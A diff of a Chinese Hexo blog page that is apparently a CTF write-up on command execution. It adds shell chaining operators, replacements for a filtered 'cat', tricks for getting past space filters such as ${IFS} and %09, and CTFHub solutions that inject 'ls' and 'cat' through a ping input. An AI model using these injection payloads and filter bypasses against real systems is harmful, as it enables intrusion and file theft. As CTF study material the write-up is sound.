@@ -16,7 +16,7 @@
 <meta property="og:description" content="命令执行常见管道符命令执行">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-09-13T01:23:55.000Z">
-<meta property="article:modified_time" content="2022-09-17T10:06:11.332Z">
+<meta property="article:modified_time" content="2023-03-24T13:17:49.544Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -174,6 +174,9 @@
 <span id="more"></span>
 
 <p>1）|（就是按位或），直接执行|后面的语句<br>2）||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>3）&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假<br>4）&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>5）; 前后都执行，无论前面真假，同&amp;，（linux也有）</p>
+<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014794539/article/details/118636836">(45条消息) CTFHUB-RCE-命令注入_Pale1c的博客-CSDN博客</a></p>
+<h5 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h5><p>cat 由第一行开始显示内容，并将所有内容输出<br>tac 从最后一行倒序显示内容，并将所有内容输出<br>more 根据窗口大小，一页一页的显示文件内容<br>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head 只显示头几行<br>tail 只显示最后几行<br>nl 类似于cat -n，显示时输出行号<br>tailf 类似于tail -f</p>
+<h5 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5><p><code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code></p>
 <h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="ACTF2020 新生赛 Exec"></a>ACTF2020 新生赛 Exec</h2><ol>
 <li>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;ls  或  127.0.0.1&amp;ls &#x2F; 或127.0.0.1|ls</li>
 <li>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;cat flag 或 127.0.0.1 &amp; cat &#x2F;flag</li>
@@ -210,6 +213,12 @@
 </ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;05d74616-1b1e-4ce5-8dbc-fade71987137&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<h2 id="ctfhub-命令注入"><a href="#ctfhub-命令注入" class="headerlink" title="ctfhub 命令注入"></a>ctfhub 命令注入</h2><ol>
+<li>127.0.0.1|ls</li>
+<li>127.0.0.1|cat 18930164348325.php</li>
+<li>127.0.0.1|cat 18930164348325.php|base64</li>
+<li>base解码得flag</li>
+</ol>
 
       
 
@@ -303,15 +312,6 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/10/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          文件上传-2
-        
-      </div>
-    </a>
-  
   
     <a href="/2022/09/12/MD5/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">MD5</div>
@@ -357,7 +357,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2022 John Doe
+    		&copy; 2023 John Doe
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -468,15 +468,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">include</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">wp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
               </li>
              
               <li class="article-tag-list-item">
